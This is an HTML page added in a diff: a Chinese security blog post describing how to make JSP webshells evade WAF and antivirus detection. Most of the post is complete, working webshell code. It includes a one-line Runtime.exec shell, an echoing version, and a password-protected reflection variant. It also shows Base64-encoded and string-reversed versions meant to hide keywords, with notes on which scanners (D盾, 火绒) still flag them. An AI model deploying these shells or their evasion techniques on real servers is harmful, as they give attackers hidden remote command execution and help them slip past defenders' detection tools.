@@ -1,0 +1,432 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+     
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<title>Jsp Webshell免杀 | ch1e的随笔</title>
+<meta name="author" content="ch1e">
+<meta name="copyright" content="ch1e">
+
+<link rel="shortcut icon" href="https://ch1e.cn/img/favicon.ico"> 
+
+
+    <meta name="keywords" content="web安全,代码审计,渗透测试,Java安全,免杀">
+
+
+
+     
+    <meta name="description" content="前言之前只会写最简单webshell，今天来不系统地学习一下Jsp的webshell的免杀方式 一句话Webshell从一句话木马角度来说，最简单的应该是 1&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;  直接调用了Runtime的exec方法，并且不进行回显，适用于反弹shell，但是就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jsp Webshell免杀">
+<meta property="og:url" content="https://ch1e.cn/2022/04/22/bypassJsp/">
+<meta property="og:site_name" content="ch1e的随笔">
+<meta property="og:description" content="前言之前只会写最简单webshell，今天来不系统地学习一下Jsp的webshell的免杀方式 一句话Webshell从一句话木马角度来说，最简单的应该是 1&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;  直接调用了Runtime的exec方法，并且不进行回显，适用于反弹shell，但是就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+<meta property="article:published_time" content="2022-04-22T08:29:43.619Z">
+<meta property="article:modified_time" content="2022-04-22T13:05:43.714Z">
+<meta property="article:author" content="ch1e">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+ 
+
+<meta http-equiv="Cache-Control" content="no-siteapp"/>
+<link href="//cdn.jsdelivr.net" rel="preconnect">
+<link href="https://ch1e.cn" rel="prefetch">
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css " rel="stylesheet">
+<link href="/css/main.css " rel="stylesheet">
+<script src="/js/utlis.js"></script>
+ 
+    
+ 
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+     
+    
+ 
+     
+
+<script>
+    var $config = {
+        tocStyle: "visible",
+        CDN:{
+            fancyboxJs: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js",
+            fancyboxCss: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css"
+        },
+        
+        
+    }
+</script>
+    
+
+
+
+
+  
+
+
+    <div id="body-wrap">
+        <nav id="nav-wrap">
+  <div class="navbar">
+    <div class="bar">
+      <a href="/" class="title">ch1e的随笔</a>
+
+      
+      <ul class="menu">
+         
+        <li><a href="/">首页</a></li>
+          
+        <li>
+          <a class="menu-child-hover" href="javascript:void(0);">找文章</a>
+          <ul class="menu-child">
+            
+            <li><a href='/tags'>标签</a></li>
+            
+            <li><a href='/archives'>归档</a></li>
+            
+          </ul>
+        </li>
+          
+        <li><a href="/link">友情链接</a></li>
+         
+      </ul>
+      <i class="fas fa-bars open-nav"></i>
+    </div>
+  </div>
+  <div id="mobile-nav">
+    <ul>
+       
+      <li><a href="/">首页</a></li>
+         
+      <li><a href='/tags'>标签</a></li>
+      
+      <li><a href='/archives'>归档</a></li>
+         
+      <li><a href="/link">友情链接</a></li>
+       
+    </ul>
+  </div>
+</nav>
+
+
+        <main id="main">
+            
+
+<article id="post">
+  <div class="post-info">
+    <div class="post-title">
+      <h1>Jsp Webshell免杀</h1>
+    </div>
+    <div class="post-meta">
+      <div class="post-date">
+        <i class="far fa-calendar-alt fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          发表于
+            2022-04-22 |
+        </span>
+        
+        <i class="fas fa-history fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          更新于
+            2022-04-22
+        </span>
+      </div>
+      <div class="post-meta-wordcount">
+        <i class="far fa-file-word fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">总字数:</span>
+        <span class="word-count">1.3k | </span>
+        <i class="far fa-clock fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">阅读时长:</span>
+        <span>7分钟</span>
+        
+      </div>
+    </div>
+  </div>
+  <div class="post-content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前只会写最简单webshell，今天来不系统地学习一下Jsp的webshell的免杀方式</p>
+<h1 id="一句话Webshell"><a href="#一句话Webshell" class="headerlink" title="一句话Webshell"></a>一句话Webshell</h1><p>从一句话木马角度来说，最简单的应该是</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接调用了Runtime的exec方法，并且不进行回显，适用于反弹shell，但是就没法进行一些其他的操作，并且是个WAF都会拦</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220422164230377.png" alt="image-20220422164230377"></p>
+<p>如果说需要加上回显，应该写成如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Runtime rt=Runtime.getRuntime();</span><br><span class="line">    String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    rt.exec(cmd);</span><br><span class="line">    InputStream inputStream = rt.exec(cmd).getInputStream();</span><br><span class="line">    InputStreamReader inputStreamReader=<span class="keyword">new</span> InputStreamReader(inputStream);</span><br><span class="line">    BufferedReader bufferedReader=<span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">    String s=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s=bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.println(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是这样使用部分命令时还是会出现500的情况，手动修改下即可，windows下在命令前面拼接 cmd /c。</p>
+<h1 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h1><p>学过Java的师傅都知道可以通过反射来执行Runtime.getRuntime.exec()，所以我们只需要把上面直接执行的方式修改下即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Locale&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String PASSWORD = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    String passwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    String cmd =request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (passwd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (passwd.equals(PASSWORD)) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> isLinux =<span class="keyword">true</span>;</span><br><span class="line">            String osType=System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            System.out.println(osType);</span><br><span class="line">            <span class="keyword">if</span> (osType!=<span class="keyword">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                isLinux=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String cmds=isLinux ? <span class="string">&quot;sh -c&quot;</span>+cmd :<span class="string">&quot;cmd /c&quot;</span>+cmd;</span><br><span class="line">            System.out.println(cmds);</span><br><span class="line">            Class rt = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            java.lang.reflect.Method gr = rt.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">            java.lang.reflect.Method ex = rt.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">            Process process = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>), cmds);</span><br><span class="line">            java.io.InputStream in = process.getInputStream();</span><br><span class="line">            out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">            java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">            java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">            String s = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                out.println(s);</span><br><span class="line">            &#125;</span><br><span class="line">            out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我还增加了判断linux和windows的功能，还加了密码以及404页面，增加隐蔽性，此时拿D盾已经扫描不出来了，但是火绒还是可以检测，其实这反射调用也是比较简单的思路，</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220422165152598.png" alt="image-20220422165152598"></p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220422165755175.png" alt="image-20220422165755175"></p>
+<h1 id="编码处理"><a href="#编码处理" class="headerlink" title="编码处理"></a>编码处理</h1><p>一些WAF啥的可能是检测一些关键词的吧，比如Runtime，Proccess啥的，我们可以对他们进行一系列编码然后解码操作，这样的话也有可能绕过WAF,下面以Base64为例</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Locale&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String PASSWORD = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    String passwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    String cmd =request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (passwd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (passwd.equals(PASSWORD)) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> isLinux =<span class="keyword">true</span>;</span><br><span class="line">            String osType=System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            System.out.println(osType);</span><br><span class="line">            <span class="keyword">if</span> (osType!=<span class="keyword">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                isLinux=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String cmds=isLinux ? <span class="string">&quot;sh -c &quot;</span>+cmd :<span class="string">&quot;cmd /c &quot;</span>+cmd;</span><br><span class="line">            System.out.println(cmds);</span><br><span class="line">            BASE64Decoder base64Decoder=<span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">            Class rt = Class.forName(<span class="keyword">new</span> String(base64Decoder.decodeBuffer(<span class="string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>)));</span><br><span class="line">            java.lang.reflect.Method gr = rt.getMethod(<span class="keyword">new</span> String(base64Decoder.decodeBuffer(<span class="string">&quot;Z2V0UnVudGltZQ==&quot;</span>)));</span><br><span class="line">            java.lang.reflect.Method ex = rt.getMethod(<span class="keyword">new</span> String(base64Decoder.decodeBuffer(<span class="string">&quot;ZXhlYw==&quot;</span>)), String.class);</span><br><span class="line">            Process process = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>), cmds);</span><br><span class="line">            java.io.InputStream in = process.getInputStream();</span><br><span class="line">            out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">            java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">            java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">            String s = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                out.println(s);</span><br><span class="line">            &#125;</span><br><span class="line">            out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是好像，和直接反射调用比，这个反而被D盾标为可疑文件了，很奇怪哈哈。</p>
+<h1 id="字符串反转"><a href="#字符串反转" class="headerlink" title="字符串反转"></a>字符串反转</h1><p>字符串反转和编码处理也是类似，对反射调用的内容进行了一个处理，让WAF没法匹配关键字</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Locale&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">re</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">        String re = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> length = str.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">            re = str.charAt(i) + re;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> re;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String PASSWORD = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    String passwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    String cmd =request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (passwd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (passwd.equals(PASSWORD)) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> isLinux =<span class="keyword">true</span>;</span><br><span class="line">            String osType=System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            System.out.println(osType);</span><br><span class="line">            <span class="keyword">if</span> (osType!=<span class="keyword">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                isLinux=<span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String cmds=isLinux ? <span class="string">&quot;sh -c &quot;</span>+cmd :<span class="string">&quot;cmd /c &quot;</span>+cmd;</span><br><span class="line">            System.out.println(cmds);</span><br><span class="line">            BASE64Decoder base64Decoder=<span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">            Class rt = Class.forName(re(<span class="string">&quot;emitnuR.gnal.avaj&quot;</span>));</span><br><span class="line">            java.lang.reflect.Method gr = rt.getMethod(re(<span class="string">&quot;emitnuRteg&quot;</span>));</span><br><span class="line">            java.lang.reflect.Method ex = rt.getMethod(re(<span class="string">&quot;cexe&quot;</span>), String.class);</span><br><span class="line">            Process process = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>), cmds);</span><br><span class="line">            java.io.InputStream in = process.getInputStream();</span><br><span class="line">            out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">            java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">            java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">            String s = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                out.println(s);</span><br><span class="line">            &#125;</span><br><span class="line">            out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是其实这个也是被D盾标为可疑文件，我的认为是这种查杀工具如果发现你有加解密或者对字符串进行变换的操作，就自动标为可疑文件，因此还是得换种方法</p>
+
+  </div>
+   
+   
+
+  
+  <div class="post-copyright">
+    <div class="post-copyright-icon"></div>
+      <div class="post-copyright-author">
+          <span class="post-copyright-meta">文章作者: </span>
+            <span class="post-copyright-info">
+              <a href="mailto:1444440144@qq.com" >ch1e</a>
+            </span>
+      </div>
+      <div class="post-copyright-type">
+          <span class="post-copyright-meta">文章链接: </span>
+            <span class="post-copyright-info">
+              <a href="https://ch1e.cn/2022/04/22/bypassJsp/" >https://ch1e.cn/2022/04/22/bypassJsp/</a>
+            </span>
+      </div><div class="post-copyright-notice">
+          <span class="post-copyright-meta">版权声明: </span>
+            <span class="post-copyright-info">本博客所有文章除特别声明外，均采用
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/ " target="_blank" >
+                  CC BY-NC-SA 4.0 </a> 许可协议。转载请注明来自
+              <a href="https://ch1e.cn/2022/04/22/bypassJsp/" target="_blank" >ch1e</a>
+              ！</span>
+      </div>
+  </div>
+  
+
+
+ 
+
+  
+    <div class="post-tag">
+        <span>
+            <i class="fa fa-tag"></i>
+             
+            <a href="tags/web安全/"><span>web安全</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/代码审计/"><span>代码审计</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/渗透测试/"><span>渗透测试</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/Java安全/"><span>Java安全</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/免杀/"><span>免杀</span></a>
+                
+            
+        </span>
+    </div>
+  
+
+
+
+
+<div class="pagination-post">
+    
+    
+    <a href="/2022/04/21/JavaRMI4/">
+      <div class="next-title">Java中JNDI,RMI,LDAP那些事(四)<i class="fas fa-chevron-right"></i></div>
+      <div class="next-desc">前言说完了RMI，来说说JNDI
+介绍JNDI(Java Naming and Directory Interface) Java命名和目录接口，通过调用JNDI的API应用程序可以定位资源和其...</div>
+    </a>
+    
+</div>
+
+</article>
+ 
+
+
+  <div id="toc-wrap">
+    <div id="toc">
+      <div class="toc-title">
+        <div>
+          目录
+            <span class="num">0%</span>
+        </div>
+        <progress class="progress" value="0" max="100"></progress>
+      </div>
+      <div class="toc-list">
+         
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9DWebshell"><span class="toc-text">一句话Webshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8"><span class="toc-text">反射调用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86"><span class="toc-text">编码处理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%8D%E8%BD%AC"><span class="toc-text">字符串反转</span></a></li></ol>
+      </div>
+    </div>
+  </div>
+
+
+        </main>
+        <section id="rightside">
+    
+    <div class="rightside-item">
+        
+        
+         
+        
+        
+            <a id="open-toc" title="目录">
+                <i class="fas fa-list-ul"></i>
+            </a>
+        
+         
+         
+        <a href="javascript:(0)" id="darkmode" title="深色/浅色 ">
+            <i class="fas fa-moon"></i>
+        </a>
+         
+        
+        <a href="#" title="回到顶部">
+            <i class="fas fa-arrow-up"></i>
+        </a>
+    </div>
+</section>
+         
+
+<footer class="footer" id="footer">
+    <div class="copyright">
+      &copy; 2020 - 2022
+        <i class="fas fa-fan"></i>
+        ch1e
+    </div>
+    <div class="framework-info">
+        <span>框架 </span>
+        <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="footer-separator">|</span>
+        <span>主题 </span>
+        <a href="https://github.com/lete114/hexo-theme-MengD" target="_blank">MengD.(萌典) </a>
+    </div>
+    
+    <div class="custom-text">我相信我可以，但我一直在路上，所以我有无限的可能！！</div>
+</footer>
+    </div>
+    <div id="mask" onclick="closeAll()"></div>
+    
+    <div class="script">
+        <script src="/js/main.js"></script>
+        
+
+
+<script src="/js/lazyload.js"></script>
+
+
+    
+
+
+        
+    <script>
+        getScript('https://cdn.jsdelivr.net/npm/pjax/pjax.min.js',LoadPjax)
+        function LoadPjax() {
+            var pjax = new Pjax({
+                selectors: [
+                    'head title',
+                    'head meta[name="keywords"]',
+                    'head meta[name="description"]',
+                    'main',
+                    '#rightside'
+                ],
+                cache: true,
+                cacheBust: false
+            });
+        }
+
+        // 清除时间
+        var timer = null;
+        // 执行进度条
+        function ProgressStart() {
+            // 设置初始进度
+            var progress = 10;
+            // 创建进度条 及 css样式
+            var div = document.createElement('div');
+            div.className = 'pjax-progress';
+            document.body.prepend(div);
+            // 定义随机数最大值最小值
+            var max = 10, mini = 3;
+            var result = max - mini;
+            // 清除
+            clearInterval(timer);
+            // 0.5秒内累加进度
+            timer = setInterval(function () {
+                // 随机数
+                var num = parseInt(Math.random() * result);
+                var randomResult = num + mini;
+                // 累加
+                progress += randomResult
+                document.getElementsByClassName('pjax-progress')[0].style.width = progress + '%';
+                // 当进度达到95%时停止
+                if (progress > 95) progress = 95
+            }, 500)
+        }
+        // 加载进度条加载完毕
+        function ProgressFinish() {
+            clearInterval(timer);
+            // 页面加载完毕后进度100% 并在0.7秒后删除
+            var progress = document.getElementsByClassName('pjax-progress');
+            progress[0].style.width = '100%';
+            timer = setTimeout(function () {
+                progress[0].parentNode.removeChild(progress[0])
+            }, 700);
+        }
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+            // 执行进度条
+            ProgressStart()
+        });
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+
+            // 加载进度条加载完毕
+            ProgressFinish()
+            // 执行所有方法
+            exeAllFn()
+
+            
+                // 图片懒加载
+                ImgLazyLoad('body img[data-img]', 'data-img')
+            
+
+
+            document.querySelectorAll('script[data-pjax]').forEach(item => {
+                const newScript = document.createElement('script')
+                const content = item.text || item.textContent || item.innerHTML || ''
+                Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+                newScript.appendChild(document.createTextNode(content))
+                item.parentNode.replaceChild(newScript, item)
+            })
+        });
+
+        // Pjax请求错误时，跳转到404页面
+        document.addEventListener('pjax:error', (err) => {
+            if (err.request.status === 404) {
+                pjax.loadUrl('/404.html')
+            }
+        })
+    </script>
+
+    </div>
+</body>
+
+</html>
